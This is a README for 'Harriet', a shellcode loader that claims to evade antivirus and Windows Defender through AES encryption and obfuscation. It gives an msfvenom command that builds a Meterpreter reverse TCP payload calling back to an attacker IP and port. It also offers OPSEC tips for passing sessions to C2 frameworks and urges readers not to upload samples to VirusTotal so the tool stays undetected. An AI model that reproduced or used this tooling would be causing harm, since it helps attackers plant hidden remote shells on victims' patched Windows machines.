![Screen Shot 2022-10-02 at 10 29 43 AM](https://user-images.githubusercontent.com/76174163/193459711-647f63a7-b7e6-49b6-9659-f63cebdbeece.png)


**Meet Harriet!**

Harriet was inspired by the Charlotte C++ shellcode loader. This tool uses AES encryption and function/variable obfuscation to get around AV and Windows Defender.

<img width="779" alt="Screen Shot 2022-10-01 at 4 52 22 PM" src="https://user-images.githubusercontent.com/76174163/193458862-256141c2-7696-40aa-a272-c7db0635c453.png">

 At the time of writing, this is only detected by 1 vendor per AntiScan.me and will give you an undetected Meterpreter reverse shell. As we all know, Meterpreter is heavily signatured so you will have to play with the features (getsystem, hashdump,ect) to see what gets caught and what doesn't. I would recommend using my Covenant Randomizer script with this to get an initial access executable and then session pass to MSF, Sliver or another C2 for better OPSEC.

The executables got past Windows Defender on both fully patched Windows 10/11 machines with the meterpreter reverse tcp payload. 

![Screen Shot 2022-10-02 at 1 01 50 PM](https://user-images.githubusercontent.com/76174163/193466612-b08f97cd-83bf-4bdb-905e-8f4ffc1a2e9e.png)

The executable also returned a Covenant grunt without detection. 

![Screen Shot 2022-10-02 at 1 07 57 PM](https://user-images.githubusercontent.com/76174163/193466844-35b0f9b2-50c1-4fb3-aa40-3ce6f32a577e.png)


There is no fancy process injection, it's just a straight AES encrypted executable. I will be working to implement other templates into the script in the future (XOR string encryption, Process Injection, ect).  
 
The majority of this script was taken from the Sektor 7 Malware Development course. All credit goes to reenz0h and @Sektor7net. I wrote this mainly as a way to get a quick undetected executable for testing and to not have to switch over to a Windows VM every five seconds for compiling. 


**Usage:** 

Create Your Payload
**msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP lport=PORT -f raw > msfr.bin**

Run the Script
**bash Harriet.sh **

Fill In The Values As Prompted

Enjoy and don't upload to Virus Total!!!!!
